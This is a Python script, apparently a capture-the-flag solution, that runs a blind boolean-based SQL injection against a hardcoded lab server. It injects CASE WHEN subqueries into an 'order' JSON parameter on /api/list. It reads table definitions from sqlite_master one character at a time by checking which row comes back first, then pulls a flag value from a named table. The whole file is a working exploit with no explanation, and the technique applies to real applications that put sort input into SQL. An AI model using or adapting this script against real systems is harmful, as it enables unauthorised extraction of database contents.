import requests 

host = "http://94.237.57.59:32675"
endpoint = "api/list"
ascii_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{} ()[],.\n\r\t;"



proxy = {
    #"http": "http://localhost:8080",
}


def getTables():
    tables = []
    tblName = ""
    offset = 0
    while True:
        found = False
        index = len(tblName) +1
    
        for char in ascii_chars:
            data = {
                "order": "CASE WHEN (SELECT hex(substr(sql,"+str(index)+",1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset "+str(offset)+") = hex('"+char+"') THEN id ELSE count END"
            }
            url = f"{host}/{endpoint}"
            r = requests.post(url, json=data, proxies=proxy)
            res = r.json()
            firstId = res[0].get("id")
            if firstId == 1:
                found = True
                tblName += char
                print("FOUND CHAR : ", tblName)
                break
        if not found:
            if tblName == "":
                print("DONE!")
                break
            print("FOUND TABLE: ", tblName)
            tables.append(tblName.replace("CREATE TABLE", "").split(" ")[1])
            print(tables)
            tblName = ""
            offset += 1
    return tables




def getFlag(table):
    tblName = ""
    offset = 0
    while True:
        found = False
        index = len(tblName) +1
    
        for char in ascii_chars:
            data = {
                "order": "CASE WHEN (SELECT hex(substr(flag,"+str(index)+",1)) FROM "+table+" limit 1 offset "+str(offset)+") = hex('"+char+"') THEN id ELSE count END"
            }
            url = f"{host}/{endpoint}"
            r = requests.post(url, json=data, proxies=proxy)
            res = r.json()
            firstId = res[0].get("id")
            if firstId == 1:
                found = True
                tblName += char
                print("FOUND CHAR : ", tblName)
                break
        if not found:
            if tblName == "":
                print("DONE!")
                break
            print("FOUND FLAG: ", tblName)
            #tables.append(tblName.replace("CREATE TABLE", "").split(" ")[1])
            #print(tables)
            tblName = ""
            offset += 1
    return tblName


#tables = getTables()
getFlag("flag_b3db687a46")
